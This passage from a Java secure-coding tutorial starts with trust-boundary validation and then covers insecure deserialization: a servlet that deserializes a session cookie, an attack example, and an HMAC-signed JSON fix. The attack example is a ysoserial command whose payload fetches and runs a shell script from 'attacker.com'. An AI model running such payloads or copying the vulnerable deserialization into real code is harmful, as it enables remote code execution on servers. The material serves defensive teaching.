**Defense in Depth Layers**:

1. **Zone-Based Validation**: Each trust zone has its own validator with zone-specific rules
```java
public class TrustBoundaryValidator {
    private final TrustZone zone;

    public TrustBoundaryValidator(TrustZone zone) {
        this.zone = zone;
    }

    public boolean containsAttackPattern(String input) {
        // Zone-specific attack pattern detection
        List<Pattern> patterns = AttackPatternRegistry.getPatternsForZone(zone);
        return patterns.stream().anyMatch(p -> p.matcher(input).find());
    }
}
```

2. **Cryptographic Boundary Tokens**: Each zone crossing generates a signed token
```java
// Token proves data was validated at specific boundary
String token = Jwts.builder()
    .claim("zone", currentZone.name())
    .claim("data_hash", computeDataHash(validatedData))
    .setExpiration(new Date(System.currentTimeMillis() + 30000))
    .signWith(SignatureAlgorithm.HS256, zoneKey)
    .compact();
```

3. **Trust Chain Verification**: Data tier verifies complete chain before database access
```java
private boolean verifyCompleteTrustChain(TrustBoundaryContext ctx) {
    // Must have crossed all boundaries in correct order
    return ctx.crossedBoundaries.containsAll(
        Arrays.asList("EXTERNAL->DMZ", "DMZ->APPLICATION", "APPLICATION->DATA"));
}
```

**Additional Protections**:

- **Never trust source zone alone**: Network segmentation can be bypassed; always verify cryptographic tokens
- **Re-validate at every boundary**: Each zone applies its own validation rules even for "validated" data
- **Audit complete trust chain**: Store provenance data to detect boundary bypass attempts in forensic analysis
- **Time-limited tokens**: Boundary tokens expire quickly (10-30 seconds) to prevent replay attacks
- **Server-side authoritative data**: Business-critical values (prices, permissions) come from server, never trusted from request
- **Fail closed**: Any boundary verification failure blocks the request entirely

**CRITICAL WARNING**: Deserializing untrusted data is one of the most dangerous vulnerabilities in Java. It has led to massive breaches including attacks against Jenkins, WebLogic, and countless enterprise applications.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;

public class SessionController extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("session".equals(cookie.getName())) {
                    // VULNERABLE: Deserializing untrusted user input!
                    byte[] data = Base64.getDecoder().decode(cookie.getValue());
                    ObjectInputStream ois = new ObjectInputStream(
                        new ByteArrayInputStream(data));

                    try {
                        // This line can execute arbitrary code!
                        UserSession session = (UserSession) ois.readObject();
                        request.setAttribute("user", session.getUsername());
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    } finally {
                        ois.close();
                    }
                }
            }
        }
    }
}
```

**Attack Payload**:
```bash
# Using ysoserial to generate malicious payload
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/shell.sh | bash" | base64 -w0

# The resulting base64 string is placed in the session cookie
# When deserialized, it executes the command on the server
```

**Why This Is Dangerous**:
- `ObjectInputStream.readObject()` instantiates objects and calls their methods during deserialization
- Gadget chains in common libraries (Commons Collections, Spring, etc.) allow arbitrary code execution
- The cast to `UserSession` happens AFTER deserialization - the damage is already done
- Attacker gains full server access with the application's privileges

**SECURE VERSION**:

```java
import java.io.*;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;

public class SecureSessionController extends HttpServlet {

    private static final String SECRET_KEY = System.getenv("SESSION_SECRET_KEY");
    private static final ObjectMapper mapper = new ObjectMapper()
        .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("session".equals(cookie.getName())) {
                    try {
                        // SECURE: Use JSON with HMAC verification instead of Java serialization
                        String signedData = cookie.getValue();
                        String[] parts = signedData.split("\\.");

                        if (parts.length != 2) {
                            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
                            return;
                        }

                        String payload = parts[0];
                        String signature = parts[1];

                        // Verify HMAC signature before parsing
                        if (!verifyHmac(payload, signature)) {
                            log("Invalid session signature from: " + request.getRemoteAddr());
                            response.sendError(HttpServletResponse.SC_FORBIDDEN);
                            return;
                        }

                        // Parse JSON safely - no code execution possible
                        byte[] jsonData = Base64.getUrlDecoder().decode(payload);
                        UserSessionDTO session = mapper.readValue(jsonData, UserSessionDTO.class);

                        // Additional validation
                        if (session.getExpiresAt() < System.currentTimeMillis()) {
                            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
                            return;
                        }

                        request.setAttribute("user", session.getUsername());

                    } catch (Exception e) {
                        log("Session parsing error: " + e.getMessage());
                        response.sendError(HttpServletResponse.SC_BAD_REQUEST);
                    }
                }
            }
        }
    }

    private boolean verifyHmac(String data, String expectedSignature) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            SecretKeySpec keySpec = new SecretKeySpec(
                SECRET_KEY.getBytes("UTF-8"), "HmacSHA256");
            mac.init(keySpec);
            byte[] computedSignature = mac.doFinal(data.getBytes("UTF-8"));
            String computed = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(computedSignature);
            return MessageDigest.isEqual(
                computed.getBytes(), expectedSignature.getBytes());
        } catch (Exception e) {
            return false;
        }
    }
}

// Simple DTO - no code execution during JSON parsing
public class UserSessionDTO {
    private String username;
    private long expiresAt;
    private String sessionId;

    // Only simple getters/setters, no custom deserialization
    public String getUsername() { return username; }
    public void setUsername(String username) { this.username = username; }
    public long getExpiresAt() { return expiresAt; }
    public void setExpiresAt(long expiresAt) { this.expiresAt = expiresAt; }
